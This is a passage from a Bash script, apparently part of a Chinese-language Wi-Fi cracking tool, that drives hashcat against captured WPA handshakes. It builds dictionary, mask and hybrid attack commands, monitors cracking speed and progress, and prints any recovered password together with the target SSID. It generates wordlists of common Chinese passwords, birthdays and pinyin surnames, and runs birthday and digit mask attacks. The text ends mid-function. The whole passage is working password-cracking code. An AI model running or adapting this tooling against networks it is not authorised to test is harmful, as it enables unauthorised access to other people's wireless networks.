                            status_found=true
                        fi
                    fi
                fi

                # 提取速度信息 - 查找所有Speed行并计算总速度
                local speed_lines=$(echo "$latest_lines" | grep "Speed\.#.*:" | tail -8)
                if [ -n "$speed_lines" ]; then
                    local total_speed_hs=0
                    local speed_count=0

                    while IFS= read -r speed_line; do
                        if [ -n "$speed_line" ]; then
                            # 提取速度数值和单位 (Speed.#1.........:  8654.2 kH/s)
                            local speed_match=$(echo "$speed_line" | sed -n 's/.*Speed\.#[0-9]*\..*:\s*\([0-9.]*\)\s*\([kMGT]*H\/s\).*/\1|\2/p' 2>/dev/null)
                            if [ -n "$speed_match" ]; then
                                local speed_num=$(echo "$speed_match" | cut -d'|' -f1)
                                local speed_unit=$(echo "$speed_match" | cut -d'|' -f2)

                                # 转换为H/s并累加
                                local speed_hs=0
                                case "$speed_unit" in
                                    "kH/s") speed_hs=$(echo "$speed_num * 1000" | bc -l 2>/dev/null | cut -d'.' -f1 || echo "0") ;;
                                    "MH/s") speed_hs=$(echo "$speed_num * 1000000" | bc -l 2>/dev/null | cut -d'.' -f1 || echo "0") ;;
                                    "GH/s") speed_hs=$(echo "$speed_num * 1000000000" | bc -l 2>/dev/null | cut -d'.' -f1 || echo "0") ;;
                                    "H/s") speed_hs=$(echo "$speed_num" | cut -d'.' -f1 || echo "0") ;;
                                esac

                                if [ "$speed_hs" -gt 0 ]; then
                                    total_speed_hs=$((total_speed_hs + speed_hs))
                                    speed_count=$((speed_count + 1))
                                fi
                            fi
                        fi
                    done <<< "$speed_lines"

                    if [ "$total_speed_hs" -gt 0 ]; then
                        current_speed="$total_speed_hs"
                        status_found=true
                    fi
                fi

                # 提取ETA信息 (Time.Estimated...: Wed Dec 25 12:34:56 2024 (1 hour, 23 mins))
                local eta_line=$(echo "$latest_lines" | grep "Time\.Estimated" | tail -1)
                if [ -n "$eta_line" ]; then
                    # 尝试提取剩余时间
                    if [[ "$eta_line" == *"sec"* ]]; then
                        eta_seconds=$(echo "$eta_line" | sed -n 's/.*(\([0-9]*\)\s*sec.*/\1/p' 2>/dev/null || echo "0")
                    elif [[ "$eta_line" == *"min"* ]]; then
                        local mins=$(echo "$eta_line" | sed -n 's/.*(\([0-9]*\)\s*min.*/\1/p' 2>/dev/null || echo "0")
                        eta_seconds=$((mins * 60))
                    elif [[ "$eta_line" == *"hour"* ]]; then
                        local hours=$(echo "$eta_line" | sed -n 's/.*(\([0-9]*\)\s*hour.*/\1/p' 2>/dev/null || echo "0")
                        eta_seconds=$((hours * 3600))
                    fi
                fi
            fi

            # 方法2：从restore文件获取进度（备用方案）
            if [ "$status_found" = false ] && [ -f "current_attack.restore" ]; then
                local restore_progress=$(strings current_attack.restore 2>/dev/null | head -1 | grep -E '^[0-9]+$' || echo "")
                if [ -n "$restore_progress" ] && [ "$restore_progress" -gt 0 ]; then
                    current_progress="$restore_progress"
                    # 基于时间估算速度
                    if [ $elapsed_time -gt 0 ]; then
                        current_speed=$((current_progress / elapsed_time))
                    fi
                    status_found=true
                fi
            fi

            # 检查进度是否有变化
            if [ "$current_progress" -eq "$last_progress" ]; then
                consecutive_no_progress=$((consecutive_no_progress + 1))
            else
                consecutive_no_progress=0
                last_progress="$current_progress"
            fi

            # 更新速度记录和历史
            if [ "$current_speed" -gt 0 ]; then
                last_speed="$current_speed"

                # 添加到速度历史记录
                speed_history+=("$current_speed")

                # 保持历史记录在指定长度内
                if [ ${#speed_history[@]} -gt $speed_history_max ]; then
                    speed_history=("${speed_history[@]:1}")  # 移除最旧的记录
                fi
            fi

            # 更新进度时间记录（用于基于进度变化的ETA计算）
            if [ "$current_progress" -gt "$last_progress_value" ]; then
                last_progress_time=$current_time
                last_progress_value=$current_progress
            fi

            # 显示进度信息
            if [ "$status_found" = true ]; then
                # 格式化速度显示
                local formatted_speed="计算中..."
                if [ "$current_speed" -gt 0 ]; then
                    if [ "$current_speed" -gt 1000000000 ]; then
                        formatted_speed=$(printf "%.1f GH/s" $(echo "scale=2; $current_speed / 1000000000" | bc -l 2>/dev/null || echo "0"))
                    elif [ "$current_speed" -gt 1000000 ]; then
                        formatted_speed=$(printf "%.1f MH/s" $(echo "scale=2; $current_speed / 1000000" | bc -l 2>/dev/null || echo "0"))
                    elif [ "$current_speed" -gt 1000 ]; then
                        formatted_speed=$(printf "%.1f KH/s" $(echo "scale=2; $current_speed / 1000" | bc -l 2>/dev/null || echo "0"))
                    else
                        formatted_speed="$current_speed H/s"
                    fi
                elif [ "$last_speed" -gt 0 ]; then
                    # 使用上次记录的速度
                    if [ "$last_speed" -gt 1000000000 ]; then
                        formatted_speed=$(printf "%.1f GH/s" $(echo "scale=2; $last_speed / 1000000000" | bc -l 2>/dev/null || echo "0"))
                    elif [ "$last_speed" -gt 1000000 ]; then
                        formatted_speed=$(printf "%.1f MH/s" $(echo "scale=2; $last_speed / 1000000" | bc -l 2>/dev/null || echo "0"))
                    elif [ "$last_speed" -gt 1000 ]; then
                        formatted_speed=$(printf "%.1f KH/s" $(echo "scale=2; $last_speed / 1000" | bc -l 2>/dev/null || echo "0"))
                    else
                        formatted_speed="$last_speed H/s"
                    fi
                fi

                # 显示详细进度信息
                local percentage=0
                local show_progress_bar=false

                # 优先使用从hashcat直接提取的百分比
                if [ -n "$progress_percentage" ] && [ "$progress_percentage" != "0" ]; then
                    percentage=$(echo "$progress_percentage" | cut -d'.' -f1 || echo "0")
                    show_progress_bar=true
                    if [ "$DEBUG_MODE" = true ]; then
                        echo "DEBUG: Using extracted percentage: $percentage%" >&2
                    fi
                # 如果有进度数字和总数，计算百分比
                elif [ "$current_progress" -gt 0 ] && [ -n "$total_passwords" ] && [ "$total_passwords" != "unknown" ] && [ "$total_passwords" -gt 0 ]; then
                    percentage=$(echo "scale=2; $current_progress * 100 / $total_passwords" | bc -l 2>/dev/null | cut -d'.' -f1 || echo "0")
                    show_progress_bar=true
                    if [ "$DEBUG_MODE" = true ]; then
                        echo "DEBUG: Calculated percentage: $percentage% ($current_progress/$total_passwords)" >&2
                    fi
                fi

                # 确保百分比在有效范围内
                if [ -z "$percentage" ] || [ "$percentage" -lt 0 ]; then
                    percentage=0
                elif [ "$percentage" -gt 100 ]; then
                    percentage=100
                fi

                if [ "$show_progress_bar" = true ]; then
                    local progress_bar=$(create_progress_bar $percentage)

                    # 动态计算ETA - 使用多种方法获得最准确的估算
                    local eta_seconds=0

                    # 方法1：基于平滑速度的计算（最准确）
                    if [ ${#speed_history[@]} -gt 0 ] && [ "$total_passwords" -gt "$current_progress" ]; then
                        local smooth_speed=$(calculate_smooth_speed "${speed_history[@]}")

                        if [ "$smooth_speed" -gt 0 ]; then
                            local remaining_passwords=$((total_passwords - current_progress))
                            eta_seconds=$((remaining_passwords / smooth_speed))

                            if [ "$DEBUG_MODE" = true ]; then
                                echo "DEBUG: ETA计算 - 剩余密码: $remaining_passwords, 平滑速度: $smooth_speed H/s, ETA: ${eta_seconds}s" >&2
                            fi
                        fi
                    fi

                    # 方法2：基于当前速度的简单计算（备用方案）
                    if [ "$eta_seconds" -eq 0 ] && [ "$current_speed" -gt 0 ] && [ "$total_passwords" -gt "$current_progress" ]; then
                        local remaining_passwords=$((total_passwords - current_progress))
                        eta_seconds=$((remaining_passwords / current_speed))

                        if [ "$DEBUG_MODE" = true ]; then
                            echo "DEBUG: ETA计算(当前速度) - 剩余密码: $remaining_passwords, 当前速度: $current_speed H/s, ETA: ${eta_seconds}s" >&2
                        fi
                    fi

                    # 方法3：基于进度变化速率的计算（第三备用方案）
                    if [ "$eta_seconds" -eq 0 ] && [ "$current_progress" -gt "$last_progress_value" ] && [ "$elapsed_time" -gt 0 ]; then
                        local progress_rate=$((current_progress / elapsed_time))  # 密码/秒
                        if [ "$progress_rate" -gt 0 ] && [ "$total_passwords" -gt "$current_progress" ]; then
                            local remaining_passwords=$((total_passwords - current_progress))
                            eta_seconds=$((remaining_passwords / progress_rate))

                            if [ "$DEBUG_MODE" = true ]; then
                                echo "DEBUG: ETA计算(进度速率) - 进度速率: $progress_rate 密码/秒, ETA: ${eta_seconds}s" >&2
                            fi
                        fi
                    fi

                    # 方法3：使用hashcat提供的ETA（如果可用且前面方法都失败）
                    if [ "$eta_seconds" -eq 0 ]; then
                        # 从之前提取的hashcat ETA信息获取
                        local hashcat_eta_line=$(echo "$latest_lines" | grep "Time\.Estimated" | tail -1)
                        if [ -n "$hashcat_eta_line" ]; then
                            if [[ "$hashcat_eta_line" == *"sec"* ]]; then
                                eta_seconds=$(echo "$hashcat_eta_line" | sed -n 's/.*(\([0-9]*\)\s*sec.*/\1/p' 2>/dev/null || echo "0")
                            elif [[ "$hashcat_eta_line" == *"min"* ]]; then
                                local mins=$(echo "$hashcat_eta_line" | sed -n 's/.*(\([0-9]*\)\s*min.*/\1/p' 2>/dev/null || echo "0")
                                eta_seconds=$((mins * 60))
                            elif [[ "$hashcat_eta_line" == *"hour"* ]]; then
                                local hours=$(echo "$hashcat_eta_line" | sed -n 's/.*(\([0-9]*\)\s*hour.*/\1/p' 2>/dev/null || echo "0")
                                eta_seconds=$((hours * 3600))
                            fi

                            if [ "$DEBUG_MODE" = true ] && [ "$eta_seconds" -gt 0 ]; then
                                echo "DEBUG: ETA计算(hashcat) - 使用hashcat提供的ETA: ${eta_seconds}s" >&2
                            fi
                        fi
                    fi

                    # 格式化ETA显示
                    local formatted_eta
                    if [ "$eta_seconds" -gt 0 ]; then
                        formatted_eta=$(format_eta $eta_seconds)
                    else
                        # 如果无法计算ETA，显示基于预估速度的粗略时间
                        if [ "$total_passwords" != "unknown" ] && [ "$total_passwords" -gt 0 ]; then
                            local base_speed
                            if [ "$DEVICE_TYPE" = "GPU" ]; then
                                base_speed=8600000  # 8.6 MH/s
                            else
                                base_speed=50000    # 50 KH/s
                            fi
                            local rough_eta=$((total_passwords / base_speed))
                            formatted_eta="~$(format_eta $rough_eta)"
                        else
                            formatted_eta="计算中..."
                        fi
                    fi

                    # 显示完整进度条
                    printf "\r${GREEN}⚡ 进度: %s %3d%% | 🔑 已尝试: %s | 💨 速度: %s | ⏱️  剩余: %s | 🕐 %ds${NC}" \
                           "$progress_bar" "$percentage" "$(printf "%'d" $current_progress)" "$formatted_speed" "$formatted_eta" "$elapsed_time"
                elif [ "$current_progress" -gt 0 ]; then
                    # 只有进度没有总数，但仍显示百分比（如果有）
                    if [ "$percentage" -gt 0 ]; then
                        local simple_bar=$(create_progress_bar $percentage)
                        printf "\r${GREEN}⚡ 进度: %s %3d%% | 🔑 已尝试: %s | 💨 速度: %s | 🕐 %ds${NC}" \
                               "$simple_bar" "$percentage" "$(printf "%'d" $current_progress)" "$formatted_speed" "$elapsed_time"
                    else
                        printf "\r${GREEN}⚡ 破解中... | 🔑 已尝试: %s | 💨 速度: %s | 🕐 已运行: %ds${NC}" \
                               "$(printf "%'d" $current_progress)" "$formatted_speed" "$elapsed_time"
                    fi
                elif [ "$percentage" -gt 0 ]; then
                    # 只有百分比，没有具体进度数字
                    local simple_bar=$(create_progress_bar $percentage)
                    printf "\r${GREEN}⚡ 进度: %s %3d%% | 💨 速度: %s | 🕐 已运行: %ds${NC}" \
                           "$simple_bar" "$percentage" "$formatted_speed" "$elapsed_time"
                else
                    # 只有速度信息
                    printf "\r${GREEN}⚡ 破解中... | 💨 速度: %s | 🕐 已运行: %ds${NC}" \
                           "$formatted_speed" "$elapsed_time"
                fi
            else
                # 没有状态信息的情况 - 检查初始化状态
                local init_status=""
                if [ -f "$STATUS_FILE" ]; then
                    local latest_lines=$(tail -10 "$STATUS_FILE" 2>/dev/null | grep -v "Hardware.Mon" | grep -v "Candidates")
                    local latest_line=$(echo "$latest_lines" | tail -1)

                    if [[ "$latest_line" == *"Dictionary cache building"* ]]; then
                        local progress=$(echo "$latest_line" | sed -n 's/.*(\([0-9.]*%\)).*/\1/p')
                        init_status="构建字典缓存 $progress"
                    elif [[ "$latest_line" == *"Initializing"* ]]; then
                        init_status="初始化设备中..."
                    elif [[ "$latest_line" == *"Starting"* ]]; then
                        init_status="启动中..."
                    elif [[ "$latest_line" == *"Finished"* ]]; then
                        init_status="准备开始破解..."
                    elif [[ "$latest_line" == *"Session"* ]] && [[ "$latest_line" == *"started"* ]]; then
                        init_status="会话已启动，准备破解..."
                    fi
                fi

                if [ -n "$init_status" ]; then
                    printf "\r${CYAN}⏳ %s | 🕐 已运行: %ds${NC}" "$init_status" "$elapsed_time"
                else
                    # 显示基本运行状态
                    if [ $iteration_count -lt 10 ]; then
                        printf "\r${YELLOW}⏳ 初始化中... | 🕐 已运行: %ds${NC}" "$elapsed_time"
                    else
                        printf "\r${GREEN}⚡ 破解进行中... | 🕐 已运行: %ds | 📊 状态检查: %d${NC}" "$elapsed_time" "$iteration_count"
                    fi
                fi
            fi

            # 调试输出（可选）
            if [ "$DEBUG_MODE" = true ]; then
                echo -e "\nDEBUG: progress=$current_progress, speed=$current_speed, elapsed=$elapsed_time, no_progress_count=$consecutive_no_progress" >&2
            fi

            sleep 2
        done
        echo -e "\n${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        local final_time=$(date +%s)
        local total_elapsed=$((final_time - start_time))
        echo -e "${CYAN}✅ 攻击阶段完成 | 总耗时: ${total_elapsed}秒${NC}"
    } &

    MONITOR_PID=$!
    local monitor_pid=$MONITOR_PID
    wait $hashcat_pid
    local exit_code=$?

    # 清理监控进程
    if kill -0 $monitor_pid 2>/dev/null; then
        kill $monitor_pid 2>/dev/null
        wait $monitor_pid 2>/dev/null
    fi

    # 重置全局变量
    HASHCAT_PID=""
    MONITOR_PID=""

    return $exit_code
}

# 创建进度条函数
create_progress_bar() {
    local percentage=$1
    local filled=$((percentage / 5))
    local empty=$((20 - filled))
    
    local bar=""
    for ((i=0; i<filled; i++)); do
        bar+="█"
    done
    for ((i=0; i<empty; i++)); do
        bar+="░"
    done
    
    echo "[$bar]"
}

# 计算密码空间大小
calculate_keyspace() {
    local attack_type="$1"
    shift
    local params="$@"
    
    case $attack_type in
        "dict")
            if [ -f "$params" ]; then
                wc -l < "$params" 2>/dev/null || echo "unknown"
            else
                echo "unknown"
            fi
            ;;
        "mask")
            # 使用hashcat的keyspace计算功能
            local keyspace_cmd="./hashcat --keyspace -a 3 $params"
            local keyspace=$(timeout 10s $keyspace_cmd 2>/dev/null)
            if [ $? -eq 0 ] && [ -n "$keyspace" ] && [[ "$keyspace" =~ ^[0-9]+$ ]]; then
                echo "$keyspace"
            else
                echo "unknown"
            fi
            ;;
        "hybrid")
            local dict_file="$1"
            shift
            local mask_params="$@"
            if [ -f "$dict_file" ]; then
                local dict_size=$(wc -l < "$dict_file" 2>/dev/null || echo "0")
                local mask_keyspace_cmd="./hashcat --keyspace -a 3 $mask_params"
                local mask_size=$(timeout 10s $mask_keyspace_cmd 2>/dev/null)
                if [ $? -eq 0 ] && [ -n "$mask_size" ] && [[ "$mask_size" =~ ^[0-9]+$ ]] && [ "$dict_size" -gt 0 ]; then
                    echo $((dict_size * mask_size))
                else
                    echo "unknown"
                fi
            else
                echo "unknown"
            fi
            ;;
        *)
            echo "unknown"
            ;;
    esac
}

# 执行带进度监控的攻击
execute_attack_with_progress() {
    local attack_name="$1"
    local attack_type="$2"
    shift 2
    local attack_params="$@"

    # 计算密码空间
    local total_passwords=$(calculate_keyspace "$attack_type" $attack_params)

    # 构建攻击命令 - 禁用硬件监控输出，保留Progress信息（移除--quiet）
    local attack_cmd=""
    case $attack_type in
        "dict")
            attack_cmd="$BASE_CMD -a 0 $attack_params --session=current_attack --status --status-timer=2 --hwmon-disable"
            ;;
        "mask")
            attack_cmd="$BASE_CMD -a 3 $attack_params --session=current_attack --status --status-timer=2 --hwmon-disable"
            ;;
        "hybrid")
            attack_cmd="$BASE_CMD -a 6 $attack_params --session=current_attack --status --status-timer=2 --hwmon-disable"
            ;;
    esac

    # 检查命令是否构建成功
    if [ -z "$attack_cmd" ]; then
        echo -e "${RED}❌ 攻击命令构建失败${NC}"
        return 1
    fi

    # 尝试启动攻击，带错误检测
    echo -e "${CYAN}启动命令: $attack_cmd${NC}"

    # 创建状态输出文件
    STATUS_FILE="/tmp/hashcat_status_$$"

    # 启动hashcat，将输出重定向到状态文件（不显示在终端）
    $attack_cmd > "$STATUS_FILE" 2>&1 &
    HASHCAT_PID=$!
    local hashcat_pid=$HASHCAT_PID

    # 等待一小段时间检查进程是否正常启动
    sleep 3
    if ! kill -0 $hashcat_pid 2>/dev/null; then
        echo -e "${RED}❌ hashcat进程启动失败或立即退出${NC}"

        # 检查错误信息
        if [ -f "$STATUS_FILE" ]; then
            echo -e "${YELLOW}错误信息:${NC}"
            tail -10 "$STATUS_FILE" | grep -E "(error|Error|ERROR|failed|Failed|FAILED)" || echo "无明确错误信息"
        fi

        echo -e "${YELLOW}可能原因:${NC}"
        echo -e "${YELLOW}1. GPU驱动未正确安装${NC}"
        echo -e "${YELLOW}2. 握手包文件损坏${NC}"
        echo -e "${YELLOW}3. 内存不足${NC}"
        echo -e "${YELLOW}4. 字典文件不存在或格式错误${NC}"

        # 尝试CPU模式作为后备
        if [ "$DEVICE_TYPE" = "GPU" ]; then
            echo -e "${YELLOW}🔄 尝试切换到CPU模式...${NC}"
            local cpu_cmd=$(echo "$attack_cmd" | sed 's/--force -O -w [0-9]/--force -w 2/')
            $cpu_cmd 2>&1 | tee "$STATUS_FILE" &
            hashcat_pid=$!
            HASHCAT_PID=$hashcat_pid
            sleep 3
            if ! kill -0 $hashcat_pid 2>/dev/null; then
                echo -e "${RED}❌ CPU模式也失败，跳过此攻击${NC}"
                if [ -f "$STATUS_FILE" ]; then
                    echo -e "${YELLOW}CPU模式错误信息:${NC}"
                    tail -5 "$STATUS_FILE"
                fi
                return 1
            fi
            echo -e "${GREEN}✅ 成功切换到CPU模式${NC}"
        else
            return 1
        fi
    fi

    # 启动进度监控
    monitor_progress "$attack_name" "$total_passwords" $hashcat_pid

    local result=$?

    # 清理会话文件
    rm -f current_attack.restore current_attack.log 2>/dev/null

    return $result
}


# 检查密码是否已破解
check_cracked() {
    # 执行hashcat --show，重定向错误信息到标准输出，然后过滤
    local show_output=$(./hashcat -m $HASH_MODE "$HANDSHAKE" --show 2>&1)

    # 过滤掉警告信息，只保留实际的破解结果
    local filtered_output=$(echo "$show_output" | grep -v "deprecated" | grep -v "plugin.*is deprecated" | grep -v "For more details" | grep -v "No such file or directory")

    # 检查过滤后的输出是否有包含冒号的破解结果行（格式：hash:password）
    if echo "$filtered_output" | grep -q ".*:.*" && [ -n "$filtered_output" ]; then
        # 提取目标网络SSID
        local target_ssid=$(extract_ssid_from_handshake "$HANDSHAKE")

        echo -e "${GREEN}🎉 密码破解成功！${NC}"
        echo -e "${CYAN}============================================${NC}"
        if [ "$target_ssid" != "未知" ]; then
            echo -e "${GREEN}🎯 目标网络: $target_ssid${NC}"
        fi
        echo -e "${GREEN}🔑 破解结果：${NC}"

        # 解析并美化显示破解结果
        echo "$filtered_output" | while IFS=':' read -r hash_part password_part; do
            if [ -n "$password_part" ]; then
                echo -e "${YELLOW}   密码: ${GREEN}$password_part${NC}"
            fi
        done

        echo -e "${CYAN}============================================${NC}"
        echo -e "${GREEN}✅ 破解完成，程序退出。${NC}"
        exit 0
    fi
}

# 显示攻击模式菜单
show_attack_menu() {
    echo -e "${BLUE}请选择破解模式：${NC}"
    echo -e "${CYAN}[1]${NC} 自动模式 - 按难度从易到难依次执行所有攻击"
    echo -e "${CYAN}[2]${NC} 快速模式 - 仅执行高效攻击(字典+常见密码)"
    echo -e "${CYAN}[3]${NC} 生日模式 - 专门破解生日相关密码"
    echo -e "${CYAN}[4]${NC} 自定义模式 - 手动选择要执行的攻击类型"
    echo -e "${CYAN}[5]${NC} 字典模式 - 选择字典文件进行攻击"
    echo -e "${CYAN}[0]${NC} 退出程序"
    echo
    read -p "请输入您的选择 [0-5]: " choice
}

# 显示自定义攻击选项
show_custom_menu() {
    echo -e "${BLUE}自定义攻击选项 (可多选，用空格分隔)：${NC}"
    echo -e "${CYAN}[1]${NC} 8位数字YYYYMMDD生日"
    echo -e "${CYAN}[2]${NC} 8位纯数字暴力破解"
    echo -e "${CYAN}[3]${NC} 2位字母+6位生日"
    echo -e "${CYAN}[4]${NC} 3位字母+6位生日"
    echo -e "${CYAN}[5]${NC} 百家姓+6位生日"
    echo -e "${CYAN}[6]${NC} 2位字母+8位生日"
    echo -e "${CYAN}[7]${NC} 3位字母+8位生日"
    echo -e "${CYAN}[8]${NC} 百家姓+8位生日"
    echo -e "${CYAN}[9]${NC} 1位字母+7位纯数字"
    echo -e "${CYAN}[10]${NC} 2位字母+6位纯数字"
    echo -e "${CYAN}[11]${NC} 3位字母+5位纯数字"
    echo -e "${CYAN}[12]${NC} 4位字母+4位纯数字"
    echo
    read -p "请输入要执行的攻击编号 (如: 1 3 5): " custom_choices
}

# 显示字典选择菜单
show_dict_menu() {
    echo -e "${BLUE}选择字典文件：${NC}"
    echo -e "${CYAN}[1]${NC} 常见中文密码字典"
    echo -e "${CYAN}[2]${NC} 数字密码字典(6-12位)"
    echo -e "${CYAN}[3]${NC} 生日密码字典(YYYYMMDD)"
    echo -e "${CYAN}[4]${NC} 百家姓拼音字典"
    echo -e "${CYAN}[5]${NC} 自定义字典文件"
    echo
    read -p "请选择字典 [1-5]: " dict_choice
}

# 显示自定义字典文件选择菜单
show_custom_dict_menu() {
    echo -e "${BLUE}选择自定义字典文件：${NC}"
    echo -e "${CYAN}字典目录: $DICT_DIR${NC}"
    echo
    
    # 检查字典目录是否存在
    if [ ! -d "$DICT_DIR" ]; then
        echo -e "${YELLOW}⚠️  字典目录不存在: $DICT_DIR${NC}"
        echo -e "${YELLOW}💡 提示: 可以设置环境变量 DICT_DIR 来自定义字典目录${NC}"
        echo -e "${CYAN}示例: export DICT_DIR=/path/to/your/dictionaries${NC}"
        echo
        read -p "是否手动输入字典文件路径? [y/N]: " manual_input
        if [[ $manual_input =~ ^[Yy]$ ]]; then
            read -p "请输入字典文件路径: " selected_dict_path
            return 0
        else
            return 1
        fi
    fi
    
    # 查找所有.txt文件
    local dict_files=()
    local counter=1
    
    # 使用find命令查找所有.txt文件，按文件名排序
    while IFS= read -r -d '' file; do
        dict_files+=("$file")
    done < <(find "$DICT_DIR" -name "*.txt" -type f -print0 2>/dev/null | sort -z)
    
    # 如果没有找到字典文件
    if [ ${#dict_files[@]} -eq 0 ]; then
        echo -e "${YELLOW}⚠️  在目录 $DICT_DIR 中未找到.txt字典文件${NC}"
        echo -e "${YELLOW}💡 请确保字典文件以.txt结尾并放置在正确的目录中${NC}"
        echo
        read -p "是否手动输入字典文件路径? [y/N]: " manual_input
        if [[ $manual_input =~ ^[Yy]$ ]]; then
            read -p "请输入字典文件路径: " selected_dict_path
            return 0
        else
            return 1
        fi
    fi
    
    # 显示字典文件列表
    echo -e "${GREEN}找到 ${#dict_files[@]} 个字典文件，正在统计密码数量和文件大小，请稍候...${NC}"
    echo
    
    for file in "${dict_files[@]}"; do
        local basename=$(basename "$file")
        local filesize=$(ls -lh "$file" 2>/dev/null | awk '{print $5}')
        local linecount=$(wc -l < "$file" 2>/dev/null || echo "unknown")
        
        # 直接显示完整行数，不使用单位缩写
        if [ "$linecount" != "unknown" ] && [ "$linecount" -gt 0 ]; then
            printf "${CYAN}[%d]${NC} %-40s ${YELLOW}(%s, %s行)${NC}\n" "$counter" "$basename" "$filesize" "$linecount"
        else
            printf "${CYAN}[%d]${NC} %-40s ${YELLOW}(%s)${NC}\n" "$counter" "$basename" "$filesize"
        fi
        
        counter=$((counter + 1))
    done
    
    echo
    echo -e "${GREEN}✅ 统计完成！请选择要使用的字典文件:${NC}"
    echo -e "${CYAN}[0]${NC}  手动输入字典文件路径"
    echo -e "${CYAN}[q]${NC}  返回上级菜单"
    echo
    
    while true; do
        read -p "请选择字典文件编号 [1-${#dict_files[@]}, 0, q]: " dict_selection
        
        case "$dict_selection" in
            "q"|"Q")
                return 1
                ;;
            "0")
                read -p "请输入字典文件路径: " selected_dict_path
                return 0
                ;;
            *)
                if [[ "$dict_selection" =~ ^[0-9]+$ ]] && [ "$dict_selection" -ge 1 ] && [ "$dict_selection" -le ${#dict_files[@]} ]; then
                    selected_dict_path="${dict_files[$((dict_selection - 1))]}"
                    echo -e "${GREEN}✅ 已选择: $(basename "$selected_dict_path")${NC}"
                    return 0
                else
                    echo -e "${RED}❌ 无效选择，请输入 1-${#dict_files[@]}、0 或 q${NC}"
                fi
                ;;
        esac
    done
}

# 执行字典攻击
execute_dict_attack() {
    case $1 in
        1)
            create_chinese_wifi_dict
            execute_attack_with_progress "中文密码字典攻击" "dict" "chinese_wifi.txt"
            ;;
        2)
            create_number_dict
            execute_attack_with_progress "数字密码字典攻击" "dict" "number_dict.txt"
            ;;
        3)
            create_birthday_dict
            execute_attack_with_progress "生日密码字典攻击" "dict" "birthday_dict.txt"
            ;;
        4)
            create_surname_dict
            execute_attack_with_progress "百家姓字典攻击" "dict" "surname_dict.txt"
            ;;
        5)
            # 调用自定义字典选择菜单
            if show_custom_dict_menu; then
                if [ -n "$selected_dict_path" ] && [ -f "$selected_dict_path" ]; then
                    # 检查文件类型，提示用户但不进行清洗
                    local file_type=$(file "$selected_dict_path" 2>/dev/null)
                    # 更精确的二进制文件检测：排除常见的文本格式
                    if [[ "$file_type" == *"binary"* ]] || [[ "$file_type" == *"executable"* ]] || [[ "$file_type" == *"compressed"* ]]; then
                        # 进一步检查：如果文件包含大量非打印字符，才认为是二进制
                        local non_printable=$(cat "$selected_dict_path" 2>/dev/null | tr -d '[:print:][:space:]' | wc -c)
                        local total_size=$(wc -c < "$selected_dict_path" 2>/dev/null || echo 0)
                        if [ "$total_size" -gt 0 ] && [ "$((non_printable * 100 / total_size))" -gt 10 ]; then
                            echo -e "${YELLOW}⚠️  检测到二进制数据文件，建议先清理：${NC}"
                            echo -e "${CYAN}./clean_dictionary.sh clean '$selected_dict_path' cleaned_dict.txt${NC}"
                            read -p "是否继续使用原文件? 可能影响性能 [y/N]: " continue_raw
                            if [[ ! $continue_raw =~ ^[Yy]$ ]]; then
                                echo -e "${YELLOW}请先清理字典文件后重试${NC}"
                                return 1
                            fi
                        fi
                    fi
                    
                    local dict_name=$(basename "$selected_dict_path")
                    echo -e "${GREEN}开始使用字典文件: $dict_name${NC}"
                    execute_attack_with_progress "自定义字典攻击($dict_name)" "dict" "$selected_dict_path"
                else
                    echo -e "${RED}字典文件 $selected_dict_path 不存在或无效${NC}"
                fi
            else
                echo -e "${YELLOW}已取消自定义字典攻击${NC}"
            fi
            ;;
    esac
}

# 创建字典文件函数
create_chinese_wifi_dict() {
    cat > chinese_wifi.txt << EOF
12345678
87654321
88888888
00000000
11111111
password
admin123
router123
wifi1234
123456789
987654321
12344321
11223344
tplink123
19900101
20000101
19901225
20001225
abcd1234
1234abcd
admin888
wifi8888
12345abc
abc12345
88881234
1234qwer
qwer1234
19851225
19881001
19900501
EOF
}

create_number_dict() {
    cat > number_dict.txt << EOF
123456
1234567
12345678
123456789
1234567890
12345612
87654321
98765432
987654321
9876543210
88888888
66666666
11111111
00000000
12344321
11223344
13579246
24681357
EOF
}

create_birthday_dict() {
    # 生成常见生日密码
    {
        # 1980-2000年的常见生日
        for year in {1980..2000}; do
            echo "${year}0101"
            echo "${year}1001"
            echo "${year}1225" 
            echo "${year}0501"
        done
        
        # 简化生日格式
        for year in {80..99}; do
            echo "${year}0101"
            echo "${year}1225"
        done
        
        for year in {00..25}; do
            printf "%02d0101\n" $year
            printf "%02d1225\n" $year
        done
    } > birthday_dict.txt
}

create_surname_dict() {
    cat > surname_dict.txt << EOF
zhang
wang
li
zhao
liu
chen
yang
huang
zhou
wu
xu
sun
zhu
ma
hu
guo
lin
he
gao
liang
zheng
luo
song
xie
tang
han
feng
yu
dong
xiao
cheng
cao
yuan
deng
xu
fu
shen
zeng
peng
lu
su
lu
蒋
cai
jia
ding
wei
xue
ye
yan
yu
pan
du
dai
xia
zhong
wang
tian
jiang
fan
shi
yao
tan
liao
zou
xiong
jin
lu
hao
kong
bai
cui
kang
mao
qiu
qin
jiang
shi
gu
hou
shao
meng
long
wan
duan
cao
qian
tang
yin
li
chang
wu
qiao
he
lai
gong
wen
EOF
}

# 攻击函数定义

# 攻击1: 8位数字YYYYMMDD生日
attack_8digit_birthday() {
    echo -e "${PURPLE}[攻击1] 8位数字YYYYMMDD生日 (1970-2025)${NC}"
    # 1990年代生日 (最高频)
    execute_attack_with_progress "1990-1999年生日" "mask" "199?d?1?2?d?d -1 01 -2 0123"
    check_cracked
    # 1980年代生日
    execute_attack_with_progress "1980-1989年生日" "mask" "198?d?1?2?d?d -1 01 -2 0123"
    check_cracked
    # 2000年代生日
    execute_attack_with_progress "2000-2009年生日" "mask" "200?d?1?2?d?d -1 01 -2 0123"
    check_cracked
    # 1970年代生日
    execute_attack_with_progress "1970-1979年生日" "mask" "197?d?1?2?d?d -1 01 -2 0123"
    check_cracked
    # 2010年代生日
    execute_attack_with_progress "2010-2019年生日" "mask" "201?d?1?2?d?d -1 01 -2 0123"
    check_cracked
    # 2020-2025年生日
    execute_attack_with_progress "2020-2025年生日" "mask" "202?1?3?2?d?d -1 012345 -2 0123 -3 01"
    check_cracked
}

# 攻击2: 8位纯数字
attack_8digit_numbers() {
    echo -e "${PURPLE}[攻击2] 8位纯数字暴力破解${NC}"
    execute_attack_with_progress "8位纯数字暴力破解" "mask" "?d?d?d?d?d?d?d?d"
    check_cracked
}

# 攻击3: 2位字母+6位生日
attack_2letter_6digit_birthday() {
